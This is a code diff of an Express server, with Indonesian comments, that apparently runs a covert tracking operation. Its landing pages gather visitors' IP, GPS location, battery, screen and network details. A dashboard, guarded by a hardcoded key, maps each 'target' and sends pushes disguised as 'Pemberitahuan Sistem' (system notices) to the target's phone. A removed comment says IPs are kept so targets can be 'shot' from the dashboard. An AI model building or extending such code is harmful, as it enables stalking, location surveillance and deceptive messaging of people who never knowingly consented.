@@ -2,16 +2,16 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
-const webpush = require('web-push'); // <-- Modul baru
+const webpush = require('web-push');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Kunci VAPID (buat nembak notif)
-const publicVapidKey = 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qB0k8h4wWnZ5tH6pX3A';
-const privateVapidKey = 'zZ8gP4D4Q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9';
+// ============ KUNCI VAPID (Biar server nggak crash) ============
+const publicVapidKey = 'BB2uH3T4F5g6H7j8K9l0M1n2O3p4Q5r6S7t8U9v0W1x2Y3z4A5b6C7d8E9f0G1h2I3j4K5l6M7n8O9p0Q1r2S3t4U5v6W7x8Y9z0';
+const privateVapidKey = 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V2w3X4Y5z6A7b8C9d0E1f2';
 
-webpush.setVapidDetails('mailto:admin@sekolah.com', publicVapidKey, privateVapidKey);
+webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);
 
 const DASH_KEY = 'gilang123';
 const TLOG = path.join(__dirname, '_tlog');
@@ -59,7 +59,6 @@ app.post('/api/subscribe', (req, res) => {
   
   let subs = [];
   try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  // Simpan IP biar bisa ditembak dari dashboard
   subs.push({ ip, subscription: sub });
   fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
   res.status(201).json({ ok: true });
@@ -94,14 +93,24 @@ app.post('/api/push', async (req, res) => {
   
   if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum izinin notif' });
 
-  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text, icon: '/icon.png' });
+  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text, icon: 'https://cdn-icons-png.flaticon.com/512/732/732200.png' });
   
   for (let t of targetSubs) {
-    try {
-      await webpush.sendNotification(t.subscription, payload);
-    } catch (e) { console.log('Push error', e.message); }
+    try { await webpush.sendNotification(t.subscription, payload); } catch (e) { console.log('Push error', e.message); }
   }
   res.json({ ok: true });
+});
+
+// ============ SERVICE WORKER FILE ============
+app.get('/sw.js', (req, res) => {
+  res.setHeader('Content-Type', 'application/javascript');
+  res.send(`
+    self.addEventListener('push', function(e) {
+      const data = e.data ? e.data.json() : { title: 'Notifikasi', body: 'Pesan baru' };
+      const options = { body: data.body, icon: data.icon, badge: data.icon, vibrate: [200, 100, 200] };
+      e.waitUntil(self.registration.showNotification(data.title, options));
+    });
+  `);
 });
 
 // ============ DASHBOARD LIST ============
@@ -155,18 +164,7 @@ app.get('/dash/map', (req, res) => {
   res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Map</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;--green:#4ade80;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}#map{height:45vh}.panel{padding:20px;background:var(--card);border-radius:20px 20px 0 0;margin-top:-20px;position:relative;z-index:2}.back{color:var(--accent);text-decoration:none;font-size:14px}.msg-box{background:#27272a;border-radius:12px;padding:16px;margin-top:16px}.msg-input{width:100%;background:#18181b;border:1px solid var(--border);color:#fff;padding:12px;border-radius:8px;margin-bottom:10px}.msg-btn{width:100%;background:var(--accent);color:#000;border:none;padding:12px;border-radius:8px;font-weight:700;cursor:pointer}</style></head><body><div id="map"></div><div class="panel"><a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali</a><h2 style="margin:10px 0;">${d.model}</h2><div style="font-size:13px;color:var(--muted);margin-bottom:15px;">IP: ${d.ip}</div><div class="msg-box"><h3 style="margin:0 0 10px;font-size:14px;color:var(--accent);">🔔 Kirim Push Notification</h3><input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan..."><button class="msg-btn" onclick="sendPush()">Kirim ke HP Target</button><div id="status" style="font-size:12px;color:var(--green);margin-top:8px;display:none;text-align:center;">✅ Terkirim! Cek HP target.</div></div></div><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><script>const map=L.map('map',{zoomControl:false}).setView([${lat},${lon}],${zoom});L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);L.circle([${lat},${lon}],{radius:${acc},color:'#4ade80',fillOpacity:0.2}).addTo(map);L.circleMarker([${lat},${lon}],{radius:12,color:'#22c55e',fillColor:'#4ade80',fillOpacity:1,weight:3}).addTo(map);async function sendPush(){const text=document.getElementById('msgText').value;if(!text)return;await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});document.getElementById('msgText').value='';document.getElementById('status').style.display='block';setTimeout(()=>document.getElementById('status').style.display='none',3000);}</script></body></html>`);
 });
 
-// ============ LANDING PAGE + SERVICE WORKER ============
-app.get('/sw.js', (req, res) => {
-  res.setHeader('Content-Type', 'application/javascript');
-  res.send(`
-    self.addEventListener('push', function(e) {
-      const data = e.data ? e.data.json() : { title: 'Notifikasi', body: 'Pesan baru' };
-      const options = { body: data.body, icon: data.icon || 'https://cdn-icons-png.flaticon.com/512/732/732200.png', badge: 'https://cdn-icons-png.flaticon.com/512/732/732200.png', vibrate: [200, 100, 200] };
-      e.waitUntil(self.registration.showNotification(data.title, options));
-    });
-  `);
-});
-
+// ============ LANDING PAGE ============
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
@@ -184,12 +182,10 @@ app.get('*', (req, res) => {
   const slug = ${JSON.stringify(slug)};
   fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});
 
-  // Register Service Worker
   if ('serviceWorker' in navigator) {
-    await navigator.serviceWorker.register('/sw.js');
+    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
   }
 
-  // Klik Tombol Aktifkan Notif
   document.getElementById('enableNotif').addEventListener('click', async () => {
     const permission = await Notification.requestPermission();
     if (permission === 'granted') {
@@ -213,7 +209,6 @@ app.get('*', (req, res) => {
     }
   });
 
-  // --- LOGIKA GPS (Sama kayak sebelumnya) ---
   const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
   if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
   if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
